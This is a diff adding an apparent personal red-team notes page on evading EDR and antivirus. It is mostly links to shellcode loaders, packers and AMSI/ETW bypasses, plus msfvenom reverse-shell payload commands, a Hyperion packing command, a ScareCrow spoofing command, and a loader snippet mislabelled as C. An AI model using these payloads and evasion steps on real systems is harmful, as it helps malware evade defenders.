@@ -1,0 +1,781 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Evading EDR and AntiVirus &mdash; CelestialTech-Notes R1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
+      <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/dark.css?v=70edf1c7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=3b1ff954"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../../_static/dark_mode_js/default_dark.js?v=fd565c74"></script>
+      <script src="../../_static/dark_mode_js/theme_switcher.js?v=358d3910"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Penetration Testing Overview" href="../../CPTS/Penetration%20Testing%20Overview.html" />
+    <link rel="prev" title="Active Scanning (T5195)" href="../recon/Active%20Scanning.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            CelestialTech-Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Offensive Methods</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../recon/Active%20Scanning.html">Active Scanning (T5195)</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Evading EDR and AntiVirus</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#manual-dropper">Manual dropper</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#c">C++</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#automatic-dropper">Automatic dropper</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#manual-loader">Manual loader</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#reminder">Reminder</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#go">Go</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#c-1">C</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#c-2">C++</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#net">.NET</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#ruby">Ruby</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#automatic-loader">Automatic loader</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#c-c">C++/C</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#c-3">C</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#nim">Nim</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#go-1">Go</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#rust">Rust</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#crystal">Crystal</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#generate-shellcode">Generate shellcode</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#msfvenom">msfvenom</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#c2-cobalt-havoc-what-ever">C2 (Cobalt/Havoc what ever)</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#asm">ASM</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#hyperion">Hyperion</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#manual-obfuscation">Manual obfuscation</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#static">Static</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#dynamic">dynamic</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#automatic-obfuscation">Automatic obfuscation</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#static-1">Static</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#dynamic-1">Dynamic</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#process-injection">Process injection</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#crt">CRT</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#apc-asyncronous-procedure-call">APC (Asyncronous Procedure Call)</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#process-hollowing">Process hollowing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#thread-execution-hijacking">Thread execution hijacking</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#psc-ptrace-system-calls">PSC (Ptrace System Calls)</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#process-doppelganging">Process Doppelganging</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#dll-injection">Dll injection</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#rwx">RWX</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#com-hijack">COM Hijack</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#remote-thread">Remote thread</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#user-apc">User APC</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#detect-virtual-machines-sandbox">Detect virtual machines (Sandbox)</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#software">Software</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#hardware">Hardware</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#osx">OSX</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#tools">Tools</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#from-pe-to-shellcode">From PE to shellcode</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#from-exe-build-with-net-to-exe-hidden">From .exe (build with .net) to .exe hidden</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#from-alive-beacon">From alive beacon</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#havoc">Havoc</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#cobalt">Cobalt</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#extensions">Extensions</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#dll">Dll</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#exe">Exe</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#hta">Hta</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#cpl">Cpl</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#link">Link</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#credits">Crédits</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#pro-tips-a-shellcode-going-through-3-open-source-packers-will-have-more-chance-to-get-detected-than-a-manual-obfuscation">Pro tips : A shellcode going through 3 open-source packers will have more chance to get detected than a manual obfuscation</a></li>
+</ul>
+</li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Reconnaissance</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Penetration%20Testing%20Overview.html">Penetration Testing Overview</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Network%20Enumeration%20with%20nmap.html">Network Enumeration with nmap</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Footprinting.html">Footprinting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Infrastructure%20Enumeration.html">Infrastructure Based Enumeration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../CPTS/Host%20Enumeration.html">Host Based Enumeration</a></li>
+</ul>
+<p class="caption" role="heading"><span class="caption-text">Tools</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../tools/dnsenum.html">dnsenum</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tools/dnsrecon.html">dnsrecon</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tools/fierce.html">fierce</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">CelestialTech-Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">Evading EDR and AntiVirus</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/OFSEC/evasion/Evading EDR and AntiVirus.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="evading-edr-and-antivirus">
+<h1>Evading EDR and AntiVirus<a class="headerlink" href="#evading-edr-and-antivirus" title="Link to this heading"></a></h1>
+<p>Status: draft</p>
+<p>Date: 2024-11-09 14:48</p>
+<p>Tags:</p>
+<section id="manual-dropper">
+<h2>Manual dropper<a class="headerlink" href="#manual-dropper" title="Link to this heading"></a></h2>
+<section id="c">
+<h3>C++<a class="headerlink" href="#c" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://blog.securityevaluators.com/creating-av-resistant-malware-part-1-7604b83ea0c0">https://blog.securityevaluators.com/creating-av-resistant-malware-part-1-7604b83ea0c0</a></p></li>
+</ul>
+</section>
+</section>
+<section id="automatic-dropper">
+<h2>Automatic dropper<a class="headerlink" href="#automatic-dropper" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/marcusbotacin/Dropper">https://github.com/marcusbotacin/Dropper</a></p></li>
+</ul>
+</section>
+<section id="manual-loader">
+<h2>Manual loader<a class="headerlink" href="#manual-loader" title="Link to this heading"></a></h2>
+<section id="reminder">
+<h3>Reminder<a class="headerlink" href="#reminder" title="Link to this heading"></a></h3>
+<ol class="arabic simple">
+<li><p>allocating memory</p></li>
+<li><p>moving shellcode into that memory</p></li>
+<li><p>executing the shellcode</p></li>
+</ol>
+</section>
+<section id="go">
+<h3>Go<a class="headerlink" href="#go" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://djnn.sh/what-i-learned-writing-a-loader-in-golang">https://djnn.sh/what-i-learned-writing-a-loader-in-golang</a></p></li>
+</ul>
+</section>
+<section id="c-1">
+<span id="id1"></span><h3>C<a class="headerlink" href="#c-1" title="Link to this heading"></a></h3>
+<ul>
+<li><div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;iostream&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">HMODULE</span><span class="w"> </span><span class="n">hMod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">&quot;shellcode.dll&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hMod</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">nullptr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">cout</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="s">&quot;Failed to load shellcode.dll&quot;</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">endl</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+</li>
+</ul>
+</section>
+<section id="c-2">
+<span id="id2"></span><h3>C++<a class="headerlink" href="#c-2" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8">https://medium.com/securebit/bypassing-av-through-metasploit-loader-64-bit-9abe55e3e0c8</a></p></li>
+<li><p><a class="reference external" href="https://github.com/ReversingID/Shellcode-Loader/tree/master/windows">https://github.com/ReversingID/Shellcode-Loader/tree/master/windows</a></p></li>
+</ul>
+</section>
+<section id="net">
+<h3>.NET<a class="headerlink" href="#net" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/">https://sevrosecurity.com/2019/05/25/bypass-windows-defender-with-a-simple-shell-loader/</a></p></li>
+</ul>
+</section>
+<section id="ruby">
+<h3>Ruby<a class="headerlink" href="#ruby" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://blog.king-sabri.net/red-team/how-to-execute-raw-shellcode-using-ruby-on-windows-and-linux">https://blog.king-sabri.net/red-team/how-to-execute-raw-shellcode-using-ruby-on-windows-and-linux</a></p></li>
+</ul>
+</section>
+</section>
+<section id="automatic-loader">
+<h2>Automatic loader<a class="headerlink" href="#automatic-loader" title="Link to this heading"></a></h2>
+<section id="c-c">
+<h3>C++/C<a class="headerlink" href="#c-c" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/TheD1rkMtr/D1rkLrd">https://github.com/TheD1rkMtr/D1rkLrd</a></p></li>
+<li><p><a class="reference external" href="https://github.com/NtDallas/Ulfberht">https://github.com/NtDallas/Ulfberht</a></p></li>
+<li><p><a class="reference external" href="https://github.com/vic4key/QLoader">https://github.com/vic4key/QLoader</a></p></li>
+<li><p><a class="reference external" href="https://github.com/xuanxuan0/DripLoader">https://github.com/xuanxuan0/DripLoader</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Hagrid29/PELoader">https://github.com/Hagrid29/PELoader</a></p></li>
+<li><p><a class="reference external" href="https://github.com/icyguider/Shhhloader">https://github.com/icyguider/Shhhloader</a></p></li>
+<li><p><a class="reference external" href="https://github.com/TheD1rkMtr/Shellcode-Hide">https://github.com/TheD1rkMtr/Shellcode-Hide</a></p></li>
+<li><p><a class="reference external" href="https://github.com/ProcessusT/Dictofuscation">https://github.com/ProcessusT/Dictofuscation</a></p></li>
+</ul>
+</section>
+<section id="c-3">
+<span id="id3"></span><h3>C<a class="headerlink" href="#c-3" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/matro7sh/Selha/blob/main/C/aes-loader-stageless.c">https://github.com/matro7sh/Selha/blob/main/C/aes-loader-stageless.c</a></p></li>
+<li><p><a class="reference external" href="https://github.com/cribdragg3r/Alaris">https://github.com/cribdragg3r/Alaris</a></p></li>
+<li><p><a class="reference external" href="https://github.com/trustedsec/COFFLoader">https://github.com/trustedsec/COFFLoader</a></p></li>
+<li><p><a class="reference external" href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Cracked5pider/KaynLdr">https://github.com/Cracked5pider/KaynLdr</a></p></li>
+<li><p><a class="reference external" href="https://github.com/mgeeky/ElusiveMice">https://github.com/mgeeky/ElusiveMice</a></p></li>
+<li><p><a class="reference external" href="https://github.com/boku7/BokuLoader">https://github.com/boku7/BokuLoader</a></p></li>
+</ul>
+</section>
+<section id="nim">
+<h3>Nim<a class="headerlink" href="#nim" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/aeverj/NimShellCodeLoader">https://github.com/aeverj/NimShellCodeLoader</a></p></li>
+<li><p><a class="reference external" href="https://github.com/sh3d0ww01f/nim_shellloader">https://github.com/sh3d0ww01f/nim_shellloader</a></p></li>
+<li><p><a class="reference external" href="https://github.com/S3cur3Th1sSh1t/Nim-RunPE">https://github.com/S3cur3Th1sSh1t/Nim-RunPE</a></p></li>
+<li><p><a class="reference external" href="https://github.com/xl00t/yetAnotherNimCrypt">https://github.com/xl00t/yetAnotherNimCrypt</a></p></li>
+</ul>
+</section>
+<section id="go-1">
+<span id="id4"></span><h3>Go<a class="headerlink" href="#go-1" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/matro7sh/myph">https://github.com/matro7sh/myph</a></p></li>
+<li><p><a class="reference external" href="https://github.com/matro7sh/221b">https://github.com/matro7sh/221b</a></p></li>
+<li><p><a class="reference external" href="https://github.com/EddieIvan01/gld">https://github.com/EddieIvan01/gld</a></p></li>
+<li><p><a class="reference external" href="https://github.com/zha0gongz1/DesertFox">https://github.com/zha0gongz1/DesertFox</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Ne0nd0g/go-shellcode">https://github.com/Ne0nd0g/go-shellcode</a></p></li>
+<li><p><a class="reference external" href="https://github.com/f1zm0/hades">https://github.com/f1zm0/hades</a></p></li>
+<li><p><a class="reference external" href="https://github.com/D3Ext/Hooka">https://github.com/D3Ext/Hooka</a></p></li>
+</ul>
+</section>
+<section id="rust">
+<h3>Rust<a class="headerlink" href="#rust" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/b1tg/rs_shellcode">https://github.com/b1tg/rs_shellcode</a></p></li>
+<li><p><a class="reference external" href="https://github.com/r4ime/shellcode_loader">https://github.com/r4ime/shellcode_loader</a></p></li>
+<li><p><a class="reference external" href="https://github.com/cr7pt0pl4gu3/Pestilence">https://github.com/cr7pt0pl4gu3/Pestilence</a></p></li>
+<li><p><a class="reference external" href="https://github.com/memN0ps/srdi-rs">https://github.com/memN0ps/srdi-rs</a></p></li>
+</ul>
+</section>
+<section id="crystal">
+<h3>Crystal<a class="headerlink" href="#crystal" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/js-on/WeaponizeCrystal/blob/main/shellcode_loader/shellcode_loader.cr">https://github.com/js-on/WeaponizeCrystal/blob/main/shellcode_loader/shellcode_loader.cr</a></p></li>
+</ul>
+</section>
+</section>
+<section id="generate-shellcode">
+<h2>Generate shellcode<a class="headerlink" href="#generate-shellcode" title="Link to this heading"></a></h2>
+<section id="msfvenom">
+<h3>msfvenom<a class="headerlink" href="#msfvenom" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">-p</span> <span class="pre">windows/x64/meterpreter/reverse_tcp</span> <span class="pre">LHOST=&lt;SERVER&gt;</span> <span class="pre">LPORT=&lt;PORT&gt;</span> <span class="pre">-f</span> <span class="pre">raw</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">-p</span> <span class="pre">windows/meterpreter/reverse_tcp</span> <span class="pre">LHOST=127.0.0.1</span> <span class="pre">--encrypt</span> <span class="pre">rc4</span> <span class="pre">--encrypt-key</span> <span class="pre">thisisakey</span> <span class="pre">-f</span> <span class="pre">dll</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">msfvenom</span> <span class="pre">-p</span> <span class="pre">windows/meterpreter/bind_tcp</span> <span class="pre">-e</span> <span class="pre">x86/shikata_ga_nai</span> <span class="pre">'\x00'</span> <span class="pre">-i</span> <span class="pre">30</span> <span class="pre">RHOST=10.0.0.68</span> <span class="pre">LPORT=9050</span> <span class="pre">-f</span> <span class="pre">c</span> <span class="pre">|</span> <span class="pre">tr</span> <span class="pre">-d</span> <span class="pre">'&quot;'</span> <span class="pre">|</span> <span class="pre">tr</span> <span class="pre">-d</span> <span class="pre">'\n'</span> <span class="pre">|</span> <span class="pre">more</span></code></p></li>
+</ul>
+</section>
+<section id="c2-cobalt-havoc-what-ever">
+<h3>C2 (Cobalt/Havoc what ever)<a class="headerlink" href="#c2-cobalt-havoc-what-ever" title="Link to this heading"></a></h3>
+</section>
+<section id="asm">
+<h3>ASM<a class="headerlink" href="#asm" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><a class="reference external" href="https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/">https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/</a></p></li>
+</ul>
+</section>
+<section id="hyperion">
+<h3>Hyperion<a class="headerlink" href="#hyperion" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p><code class="docutils literal notranslate"><span class="pre">wine</span> <span class="pre">hyperion.exe</span> <span class="pre">/root/payloads/shellter/shellter_putty_reverse_x86.exe</span></code></p></li>
+</ul>
+</section>
+</section>
+<section id="manual-obfuscation">
+<h2>Manual obfuscation<a class="headerlink" href="#manual-obfuscation" title="Link to this heading"></a></h2>
+<section id="static">
+<h3>Static<a class="headerlink" href="#static" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Packing</p>
+<ul>
+<li><p><a class="reference external" href="https://pentester.blog/?p=39">https://pentester.blog/?p=39</a></p></li>
+<li><p><a class="reference external" href="https://github.com/frank2/packer-tutorial">https://github.com/frank2/packer-tutorial</a></p></li>
+</ul>
+</li>
+<li><p>Polymorph</p>
+<ul>
+<li><p><a class="reference external" href="https://www.exploit-db.com/papers/13874">https://www.exploit-db.com/papers/13874</a></p></li>
+</ul>
+</li>
+<li><p>Signature hiding</p>
+<ul>
+<li><p><a class="reference external" href="https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates">https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates</a></p></li>
+</ul>
+</li>
+<li><p>CFG</p>
+<ul>
+<li><p>ROP</p>
+<ul>
+<li><p><a class="reference external" href="https://improsec.com/tech-blog/bypassing-control-flow-guard-on-windows-10-part-ii">https://improsec.com/tech-blog/bypassing-control-flow-guard-on-windows-10-part-ii</a></p></li>
+</ul>
+</li>
+<li><p><a class="reference external" href="https://joshpitts.medium.com/hooking-control-flow-guard-cfg-for-fun-and-profit-31f951485545">https://joshpitts.medium.com/hooking-control-flow-guard-cfg-for-fun-and-profit-31f951485545</a></p></li>
+<li><p><a class="reference external" href="https://citeseerx.ist.psu.edu/document?repid=rep1&amp;type=pdf&amp;doi=ade1cc22ee994c1b353326ae4cedccd29f33b8d0">https://citeseerx.ist.psu.edu/document?repid=rep1&amp;type=pdf&amp;doi=ade1cc22ee994c1b353326ae4cedccd29f33b8d0</a></p></li>
+<li><p>CFG flattening</p>
+<ul>
+<li><p><a class="reference external" href="http://ac.inf.elte.hu/Vol_030_2009/003.pdf">http://ac.inf.elte.hu/Vol_030_2009/003.pdf</a></p></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Change logo/icon</p>
+<ul>
+<li><p><a class="reference external" href="https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/resources?redirectedfrom=MSDN">https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/resources?redirectedfrom=MSDN</a></p></li>
+</ul>
+</li>
+<li><p>Change date of compilation</p></li>
+<li><p>Bypass AMSI</p>
+<ul>
+<li><p><a class="reference external" href="https://rastamouse.me/memory-patching-amsi-bypass/">https://rastamouse.me/memory-patching-amsi-bypass/</a></p></li>
+<li><p><a class="reference external" href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/">https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/</a></p></li>
+<li><p><a class="reference external" href="https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/">https://www.pentestpartners.com/security-blog/patchless-amsi-bypass-using-sharpblock/</a></p></li>
+</ul>
+</li>
+<li><p>Description</p></li>
+<li><p>Add signature</p>
+<ul>
+<li><p><a class="reference external" href="https://gist.github.com/jenaye/a0132882fed7072ea2bce33da40e0de5">https://gist.github.com/jenaye/a0132882fed7072ea2bce33da40e0de5</a></p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="dynamic">
+<h3>dynamic<a class="headerlink" href="#dynamic" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Network</p>
+<ul>
+<li><p>C2 by DNS</p></li>
+<li><p>P2P (hide ip from C2)</p></li>
+<li><p>HTTPS</p></li>
+</ul>
+</li>
+<li><p>Direct syscalls</p>
+<ul>
+<li><p><a class="reference external" href="https://medium.com/&#64;merasor07/av-edr-evasion-using-direct-system-calls-user-mode-vs-kernel-mode-fad2fdfed01a">https://medium.com/&#64;merasor07/av-edr-evasion-using-direct-system-calls-user-mode-vs-kernel-mode-fad2fdfed01a</a></p></li>
+<li><p><a class="reference external" href="https://thewover.github.io/Dynamic-Invoke/">https://thewover.github.io/Dynamic-Invoke/</a></p></li>
+</ul>
+</li>
+<li><p>Delayed execution</p>
+<ul>
+<li><p>WaitForSingleObjectEx</p>
+<ul>
+<li><p><a class="reference external" href="https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html">https://www.purpl3f0xsecur1ty.tech/2021/03/30/av_evasion.html</a></p></li>
+</ul>
+</li>
+<li><p>Foliage</p></li>
+<li><p>Ekko</p>
+<ul>
+<li><p>A small sleep obfuscation technique that uses
+CreateTimerQueueTimer Win32 API</p></li>
+</ul>
+</li>
+<li><p>Deathsleep</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/janoglezcampos/DeathSleep">https://github.com/janoglezcampos/DeathSleep</a></p></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Disable ETW</p>
+<ul>
+<li><p><a class="reference external" href="https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/">https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/</a></p></li>
+</ul>
+</li>
+<li><p>DInvoke</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/TheWover/DInvoke">https://github.com/TheWover/DInvoke</a></p></li>
+</ul>
+</li>
+</ul>
+</section>
+</section>
+<section id="automatic-obfuscation">
+<h2>Automatic obfuscation<a class="headerlink" href="#automatic-obfuscation" title="Link to this heading"></a></h2>
+<section id="static-1">
+<span id="id5"></span><h3>Static<a class="headerlink" href="#static-1" title="Link to this heading"></a></h3>
+<ul class="simple">
+<li><p>Packing</p>
+<ul>
+<li><p>Office macro</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a></p></li>
+<li><p><a class="reference external" href="https://github.com/optiv/Ivy">https://github.com/optiv/Ivy</a></p></li>
+</ul>
+</li>
+<li><p><a class="reference external" href="https://github.com/phra/PEzor">https://github.com/phra/PEzor</a></p></li>
+<li><p><a class="reference external" href="https://github.com/klezVirus/inceptor">https://github.com/klezVirus/inceptor</a></p></li>
+<li><p><a class="reference external" href="https://github.com/govolution/avet">https://github.com/govolution/avet</a></p></li>
+<li><p><a class="reference external" href="https://github.com/Nariod/RustPacker">https://github.com/Nariod/RustPacker</a></p></li>
+<li><p><a class="reference external" href="https://github.com/DavidBuchanan314/monomorph">https://github.com/DavidBuchanan314/monomorph</a></p></li>
+<li><p><a class="reference external" href="https://github.com/upx/upx">https://github.com/upx/upx</a></p></li>
+<li><p><a class="reference external" href="https://github.com/EgeBalci/sgn">https://github.com/EgeBalci/sgn</a></p></li>
+</ul>
+</li>
+<li><p>AMSI Bypass</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/CCob/SharpBlock">https://github.com/CCob/SharpBlock</a></p></li>
+<li><p><a class="reference external" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p></li>
+<li><p><a class="reference external" href="https://github.com/klezVirus/Chameleon">https://github.com/klezVirus/Chameleon</a></p></li>
+<li><p><a class="reference external" href="https://github.com/tokyoneon/Chimera">https://github.com/tokyoneon/Chimera</a></p></li>
+</ul>
+</li>
+<li><p>Signature hiding</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/optiv/ScareCrow">https://github.com/optiv/ScareCrow</a></p>
+<ul>
+<li><p><code class="docutils literal notranslate"><span class="pre">ScareCrow</span> <span class="pre">-I</span> <span class="pre">/Path/To/ShellCode</span> <span class="pre">-d</span> <span class="pre">facebook.com</span></code></p></li>
+</ul>
+</li>
+<li><p><a class="reference external" href="https://github.com/paranoidninja/CarbonCopy">https://github.com/paranoidninja/CarbonCopy</a></p></li>
+</ul>
+</li>
+<li><p>LOLBIN</p>
+<ul>
+<li><p>RemComSvc</p>
+<ul>
+<li><p><a class="reference external" href="https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb">https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb</a></p></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Entropy</p>
+<ul>
+<li><p><a class="reference external" href="https://github.com/kleiton0x00/Shelltropy">https://github.com/kleiton0x00/Shelltropy</a></p></li>
+</ul>
+</li>
+</ul>
+</section>
